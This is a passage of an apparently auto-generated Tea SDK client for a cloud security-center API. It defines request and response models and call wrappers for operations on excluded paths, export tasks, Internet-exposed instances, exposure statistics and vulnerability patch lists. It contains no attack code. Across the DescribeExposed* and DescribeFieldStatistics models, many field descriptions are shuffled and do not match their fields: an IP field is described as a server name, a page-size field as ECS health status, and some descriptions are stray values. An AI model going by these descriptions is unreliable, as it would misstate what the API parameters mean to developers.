  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeExcludeSystemPathResponseBody = {
  excludePaths?: [ 
    {
      os?: string(name='Os', example='linux'),
      path?: string(name='Path', example='/bin/'),
    }
  ](name='ExcludePaths'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='55'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='FBBEB173-1F43-505F-A876-C03ECDF6****'),
}

model DescribeExcludeSystemPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExcludeSystemPathResponseBody(name='body'),
}

async function describeExcludeSystemPathWithOptions(request: DescribeExcludeSystemPathRequest, runtime: Util.RuntimeOptions): DescribeExcludeSystemPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExcludeSystemPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExcludeSystemPath(request: DescribeExcludeSystemPathRequest): DescribeExcludeSystemPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExcludeSystemPathWithOptions(request, runtime);
}

model DescribeExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.

> You can call the [ExportRecord](~~ExportRecord~~) operation to query the IDs of export tasks.', example='111'),
}

model DescribeExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='20'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task.

Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='health_check_export_20171123'),
  id?: long(name='Id', description='The ID of the export task.', example='131231'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the task result. The value is fixed as **success**, which indicates that the task is complete.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='16'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the exported Excel file.', example='100'),
}

model DescribeExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExportInfoResponseBody(name='body'),
}

async function describeExportInfoWithOptions(request: DescribeExportInfoRequest, runtime: Util.RuntimeOptions): DescribeExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExportInfo(request: DescribeExportInfoRequest): DescribeExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExportInfoWithOptions(request, runtime);
}

model DescribeExposedCheckWarningRequest {
  lang?: string(name='Lang', example='zh'),
  typeName?: string(name='TypeName', example='weak_password'),
  uuids?: string(name='Uuids', example='6541631a-7d47-41fd-9fef-9518113f****'),
}

model DescribeExposedCheckWarningResponseBody = {
  count?: int32(name='Count', example='10'),
  requestId?: string(name='RequestId', example='6D9CDB47-6191-4415-BE63-7E8B12CD****'),
  warningList?: [ 
    {
      riskId?: long(name='RiskId', example='107'),
      riskName?: string(name='RiskName', example='Weak password-Redis DB login weak password baseline'),
      subTypeAlias?: string(name='SubTypeAlias', example='Redis DB login weak password baseline'),
      typeAlias?: string(name='TypeAlias', example='Weak password'),
      uuid?: string(name='Uuid', example='1d35b031-ee4e-4e53-8b53-465ab712****'),
    }
  ](name='WarningList'),
}

model DescribeExposedCheckWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedCheckWarningResponseBody(name='body'),
}

async function describeExposedCheckWarningWithOptions(request: DescribeExposedCheckWarningRequest, runtime: Util.RuntimeOptions): DescribeExposedCheckWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedCheckWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedCheckWarning(request: DescribeExposedCheckWarningRequest): DescribeExposedCheckWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedCheckWarningWithOptions(request, runtime);
}

model DescribeExposedInstanceCriteriaRequest {
  value?: string(name='Value', description='DescribeExposedInstanceCriteria', example='id'),
}

model DescribeExposedInstanceCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='instanceId'),
      type?: string(name='Type', example='select'),
      values?: string(name='Values', example='i-bp19r0fdd39idxhf****'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeExposedInstanceCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceCriteriaResponseBody(name='body'),
}

async function describeExposedInstanceCriteriaWithOptions(request: DescribeExposedInstanceCriteriaRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceCriteria(request: DescribeExposedInstanceCriteriaRequest): DescribeExposedInstanceCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceCriteriaWithOptions(request, runtime);
}

model DescribeExposedInstanceDetailRequest {
  uuid?: string(name='Uuid', description='The server group to which the server belongs.', example='fc82b966-4d70-4e01-bf4f-aa4076a5****'),
}

model DescribeExposedInstanceDetailResponseBody = {
  exposedChains?: [ 
    {
      allVulList?: [ 
        {
          aliasName?: string(name='AliasName', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', example='asap'),
          type?: string(name='Type', example='sca'),
          uuid?: string(name='Uuid', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='AllVulList'),
      exposureComponent?: string(name='ExposureComponent', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the value of the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, the value of this parameter is an empty string.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the Internet-facing SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The name of the server.', example='47.99.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The information about the vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='22'),
      exposureType?: string(name='ExposureType', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The public IP address of the server.', example='eip-bp1bkgowzam49rld3****'),
      groupNo?: string(name='GroupNo', description='The port that is exposed on the Internet.', example='sg-bp1iw5enua6gf5i2xr7z'),
      instanceId?: string(name='InstanceId', description='The public IP address.', example='i-bp116qem8npvchqc****'),
      instanceName?: string(name='InstanceName', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **sca**: middleware vulnerabilities', example='worker-k8s-for-cs-c929ee2a145214f89a8b248005be5****'),
      internetIp?: string(name='InternetIp', description='The alias of the vulnerability.', example='47.99.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The name of the vulnerability.', example='192.168.XX.XX'),
      realVulList?: [ 
        {
          aliasName?: string(name='AliasName', description='Queries the details about a specified server that is exposed on the Internet.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', description='DescribeExposedInstanceDetail', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', description='The ID of the request, which is used to locate and troubleshoot issues.', example='asap'),
          type?: string(name='Type', description='The resource from which the server is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an Elastic Compute Service (ECS) instance
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **EIP**: an elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='sca'),
          uuid?: string(name='Uuid', description='The ID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='RealVulList', description='The information about all vulnerabilities on the server.'),
      regionId?: string(name='RegionId', description='The alias of the vulnerability.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
    }
  ](name='ExposedChains', description='The UUID of the server that is exposed on the Internet.

>  You can call the [DescribeExposedInstanceList](~~DescribeExposedInstanceList~~) operation to query the UUIDs of servers.'),
  requestId?: string(name='RequestId', description='The exposure details about the server.', example='C590482B-54A7-4273-8115-9DBE2DE46B26'),
}

model DescribeExposedInstanceDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceDetailResponseBody(name='body'),
}

async function describeExposedInstanceDetailWithOptions(request: DescribeExposedInstanceDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceDetail(request: DescribeExposedInstanceDetailRequest): DescribeExposedInstanceDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceDetailWithOptions(request, runtime);
}

model DescribeExposedInstanceListRequest {
  currentPage?: int32(name='CurrentPage', description='The server component that is exposed on the Internet.', example='1'),
  exposureComponent?: string(name='ExposureComponent', description='The total number of servers that are exposed on the Internet.', example='openssl'),
  exposureIp?: string(name='ExposureIp', description='The ID of the region where the server resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='116.12.XX.XX'),
  exposurePort?: string(name='ExposurePort', description='The public IP address that is exposed on the Internet.', example='22'),
  groupId?: long(name='GroupId', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='9535356'),
  healthStatus?: boolean(name='HealthStatus', description='The name of the server.', example='Unhealthy'),
  instanceId?: string(name='InstanceId', description='The UUID of the server.', example='i-bp1g6wxdwps7s9dz****'),
  instanceName?: string(name='InstanceName', description='The ID of the server group.', example='abc_centos7.2_005'),
  pageSize?: int32(name='PageSize', description='The health status of the Elastic Compute Service (ECS) instance in the scaling group. ECS instances that are not in the Running state are considered unhealthy. Valid values:

*   Healthy
*   Unhealthy

Auto Scaling automatically removes unhealthy ECS instances from the scaling group and then releases the automatically created instances among the unhealthy instances.

Unhealthy ECS instances that are manually added to the scaling group are released based on the management mode of the instance lifecycle. If the lifecycle of the ECS instances is not managed by the scaling group, Auto Scaling removes the instances from the scaling group but does not release them. If the lifecycle of the ECS instances is managed by the scaling group, Auto Scaling removes the instances from the scaling group and releases them.

>  Make sure that you have sufficient balance within your account. If you have overdue payments in your account, pay-as-you-go and preemptible instances are stopped or released. For information about how the status of ECS instances changes when you have overdue payments in your account, see [Overdue payments](~~170589~~).', example='20'),
  vulStatus?: boolean(name='VulStatus', description='The public IP address of the server.', example='true'),
}

model DescribeExposedInstanceListResponseBody = {
  exposedInstances?: [ 
    {
      asapVulCount?: int32(name='AsapVulCount', description='An array that consists of the details about the exposed asset.', example='0'),
      exploitHealthCount?: int32(name='ExploitHealthCount', example='0'),
      exposureComponent?: string(name='ExposureComponent', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The number of entries returned on the current page.', example='116.12.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='Queries the information about the servers that are exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='Specifies whether the server has vulnerabilities. Valid values:

*   **true**: The server has vulnerabilities.
*   **false**: The server does not have vulnerabilities.', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='i-ew11313a****'),
      groupId?: long(name='GroupId', example='9469268'),
      groupName?: string(name='GroupName', example='testGroup'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1g6wxdwps7s9dz****'),
      instanceName?: string(name='InstanceName', example='abc_centos7.2_005'),
      internetIp?: string(name='InternetIp', description='The pagination information.', example='116.12.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The number of entries returned per page.', example='192.168.XX.XX'),
      laterVulCount?: int32(name='LaterVulCount', example='0'),
      nntfVulCount?: int32(name='NntfVulCount', description='The private IP address of the server.', example='0'),
      regionId?: string(name='RegionId', description='The ID of the server.', example='cn-hangzhou'),
      totalVulCount?: int32(name='TotalVulCount', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, this parameter is empty.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='0'),
      uuid?: string(name='Uuid', description='DescribeExposedInstanceList', example='dd803d9e-a337-4add-9c5b-7d503e08****'),
    }
  ](name='ExposedInstances', description='The port that is exposed on the Internet.'),
  pageInfo?: {
    count?: int32(name='Count', description='The ID of the server group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of low-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='20'),
    totalCount?: int32(name='TotalCount', description='The number of medium-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='2'),
  }(name='PageInfo', description='The public IP address of the server.'),
  requestId?: string(name='RequestId', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an ECS instance
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **EIP**: an elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='598A4A61-ABA7-456B-8725-7378258276D9'),
}

model DescribeExposedInstanceListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceListResponseBody(name='body'),
}

async function describeExposedInstanceListWithOptions(request: DescribeExposedInstanceListRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exposureComponent)) {
    query['ExposureComponent'] = request.exposureComponent;
  }
  if (!Util.isUnset(request.exposureIp)) {
    query['ExposureIp'] = request.exposureIp;
  }
  if (!Util.isUnset(request.exposurePort)) {
    query['ExposurePort'] = request.exposurePort;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.healthStatus)) {
    query['HealthStatus'] = request.healthStatus;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vulStatus)) {
    query['VulStatus'] = request.vulStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceList(request: DescribeExposedInstanceListRequest): DescribeExposedInstanceListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceListWithOptions(request, runtime);
}

model DescribeExposedStatisticsResponseBody = {
  exposedAsapVulCount?: int32(name='ExposedAsapVulCount', example='1'),
  exposedComponentCount?: int32(name='ExposedComponentCount', description='The total number of low-risk vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='7'),
  exposedInstanceCount?: int32(name='ExposedInstanceCount', description='DescribeExposedStatistics', example='100'),
  exposedIpCount?: int32(name='ExposedIpCount', example='100'),
  exposedLaterVulCount?: int32(name='ExposedLaterVulCount', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5'),
  exposedNntfVulCount?: int32(name='ExposedNntfVulCount', example='0'),
  exposedPortCount?: int32(name='ExposedPortCount', description='Queries the exposure statistics of the assets on the Internet.', example='6'),
  exposedWeekPasswordMachineCount?: int32(name='ExposedWeekPasswordMachineCount', example='20'),
  gatewayAssetCount?: int32(name='GatewayAssetCount', example='3'),
  requestId?: string(name='RequestId', description='The total number of servers that are exposed on the Internet.', example='4B897D10-B3CD-4A93-A5FA-591F3ED12A86'),
}

model DescribeExposedStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsResponseBody(name='body'),
}

async function describeExposedStatisticsWithOptions(runtime: Util.RuntimeOptions): DescribeExposedStatisticsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedStatistics(): DescribeExposedStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsWithOptions(runtime);
}

model DescribeExposedStatisticsDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries returned on the current page.', example='1'),
  pageSize?: int32(name='PageSize', description='The ID of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**.', example='20'),
  statisticsType?: string(name='StatisticsType', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='exposureType'),
  statisticsTypeGatewayType?: string(name='StatisticsTypeGatewayType', description='The system component that is exposed on the Internet.', example='SLB'),
  statisticsTypeInstanceValue?: string(name='StatisticsTypeInstanceValue', description='The pagination information.', example='lb-2ze4rso39h4nczcqs****'),
}

model DescribeExposedStatisticsDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='An array consisting of the gateway assets, ports, system components, or public IP addresses that are exposed on the Internet and are returned.', example='2'),
    currentPage?: int32(name='CurrentPage', description='exposureType', example='1'),
    pageSize?: int32(name='PageSize', description='The port that is exposed on the Internet.', example='20'),
    totalCount?: int32(name='TotalCount', description='lb-2ze4rso39h4nczcqs****', example='2'),
  }(name='PageInfo', description='The number of the page to return.'),
  requestId?: string(name='RequestId', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the IP address of the Elastic Compute Service (ECS) instance
*   **SLB**: the public IP address of the SLB instance
*   **EIP**: the elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='7CBAFB3F-1ED7-4A23-986A-6F67F0466BD1'),
  statisticsDetails?: [ 
    {
      exposedCount?: int32(name='ExposedCount', description='The total number of system vulnerabilities that are detected on your server and are exposed on the Internet.', example='0'),
      exposureComponent?: string(name='ExposureComponent', description='Queries the gateway assets, ports, system components, or public IP addresses that are exposed on the Internet.', example='tomcat'),
      exposureIp?: string(name='ExposureIp', description='The type of the gateway asset. This parameter is required when the **StatisticsType** parameter is set to **exposureType**. Valid values:

*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='123.57.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The number of entries returned per page.', example='22'),
      exposureType?: string(name='ExposureType', description='The ID of the request, which is used to locate and troubleshoot issues.', example='SLB'),
      exposureTypeId?: string(name='ExposureTypeId', description='DescribeExposedStatisticsDetail', example='lb-2ze4rso39h4nczcqs****'),
      exposureTypeInstanceName?: string(name='ExposureTypeInstanceName', description='The name of the gateway asset that is exposed on the Internet.', example='ngw-bp1vkbju8f3w87c9v****'),
      regionId?: string(name='RegionId', description='20', example='cn-hangzhou'),
    }
  ](name='StatisticsDetails', description='The region ID of the asset.'),
}

model DescribeExposedStatisticsDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedStatisticsDetailResponseBody(name='body'),
}

async function describeExposedStatisticsDetailWithOptions(request: DescribeExposedStatisticsDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedStatisticsDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.statisticsType)) {
    query['StatisticsType'] = request.statisticsType;
  }
  if (!Util.isUnset(request.statisticsTypeGatewayType)) {
    query['StatisticsTypeGatewayType'] = request.statisticsTypeGatewayType;
  }
  if (!Util.isUnset(request.statisticsTypeInstanceValue)) {
    query['StatisticsTypeInstanceValue'] = request.statisticsTypeInstanceValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedStatisticsDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedStatisticsDetail(request: DescribeExposedStatisticsDetailRequest): DescribeExposedStatisticsDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedStatisticsDetailWithOptions(request, runtime);
}

model DescribeFieldStatisticsRequest {
  machineTypes?: string(name='MachineTypes', description='The total number of cloud services that are protected by Security Center.', example='ecs'),
  regionId?: string(name='RegionId', description='The number of regions to which the servers belong.', example='cn-hangzhou'),
}

model DescribeFieldStatisticsResponseBody = {
  groupedFields?: {
    aliYunInstanceCount?: int32(name='AliYunInstanceCount', example='100'),
    awsInstanceCount?: int32(name='AwsInstanceCount', example='100'),
    azureInstanceCount?: int32(name='AzureInstanceCount', example='5'),
    exposedInstanceCount?: int32(name='ExposedInstanceCount', description='The data returned.', example='1'),
    generalAssetCount?: int32(name='GeneralAssetCount', description='The number of server groups.', example='10'),
    groupCount?: int32(name='GroupCount', description='The type of the asset to query. If no asset types are specified, all types of assets are returned. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='20'),
    huaweiInstanceCount?: int32(name='HuaweiInstanceCount', example='0'),
    idcInstanceCount?: int32(name='IdcInstanceCount', description='DescribeFieldStatistics', example='100'),
    importantAssetCount?: int32(name='ImportantAssetCount', description='The number of assets that are at risk.', example='10'),
    instanceCount?: int32(name='InstanceCount', description='The number of assets that are deployed on Alibaba Cloud.', example='100'),
    instanceSyncTaskCount?: int32(name='InstanceSyncTaskCount', description='The number of assets whose importance is common.', example='10'),
    newInstanceCount?: int32(name='NewInstanceCount', description='The number of assets whose statuses are unknown.', example='10'),
    noRiskInstanceCount?: int32(name='NoRiskInstanceCount', description='The number of servers that are shut down.', example='10'),
    notRunningStatusCount?: int32(name='NotRunningStatusCount', description='WB01224678', example='10'),
    offlineInstanceCount?: int32(name='OfflineInstanceCount', description='The number of unprotected assets.', example='21'),
    outMachineInstanceCount?: int32(name='OutMachineInstanceCount', example='20'),
    pauseInstanceCount?: int32(name='PauseInstanceCount', description='Queries the statistics of assets that belong to your account.', example='10'),
    regionCount?: int32(name='RegionCount', description='The number of virtual private clouds (VPCs).', example='11'),
    riskInstanceCount?: int32(name='RiskInstanceCount', example='90'),
    tencentInstanceCount?: int32(name='TencentInstanceCount', description='The number of servers.', example='10'),
    testAssetCount?: int32(name='TestAssetCount', description='The number of servers outside the cloud.', example='10'),
    tripartiteInstanceCount?: int32(name='TripartiteInstanceCount', example='2'),
    unKnowStatusInstanceCount?: int32(name='UnKnowStatusInstanceCount', description='The number of newly added servers.', example='1'),
    unprotectedInstanceCount?: int32(name='UnprotectedInstanceCount', description='The number of servers whose Security Center agent status is Offline.', example='10'),
    vpcCount?: int32(name='VpcCount', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5'),
  }(name='GroupedFields', description='The number of assets whose importance is test.'),
  requestId?: string(name='RequestId', description='The information about servers that are returned.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFieldStatisticsResponseBody(name='body'),
}

async function describeFieldStatisticsWithOptions(request: DescribeFieldStatisticsRequest, runtime: Util.RuntimeOptions): DescribeFieldStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeFieldStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeFieldStatistics(request: DescribeFieldStatisticsRequest): DescribeFieldStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFieldStatisticsWithOptions(request, runtime);
}

model DescribeFrontVulPatchListRequest {
  info?: string(name='Info', example='[{"name":"5000803","uuid":"026c9296-1234-5678-b937-a7d81f05****","tag":"system"}]'),
  lang?: string(name='Lang', example='zh'),
  operateType?: string(name='OperateType', example='vul_fix'),
  type?: string(name='Type', example='sys'),
}

model DescribeFrontVulPatchListResponseBody = {
  frontPatchList?: [ 
    {
      patchList?: [ 
        {
          aliasName?: string(name='AliasName', example='RHBA-2019:2599: krb5 bug fix update'),
          name?: string(name='Name', example='4523204'),
        }
      ](name='PatchList'),
      uuid?: string(name='Uuid', example='1587bedb-fdb4-48c4-9330-4545****'),
    }
  ](name='FrontPatchList'),
  requestId?: string(name='RequestId', example='F929E952-EBFC-56C3-BD35-BF8B59024C68'),
}

model DescribeFrontVulPatchListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeFrontVulPatchListResponseBody(name='body'),
}

async function describeFrontVulPatchListWithOptions(request: DescribeFrontVulPatchListRequest, runtime: Util.RuntimeOptions): DescribeFrontVulPatchListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
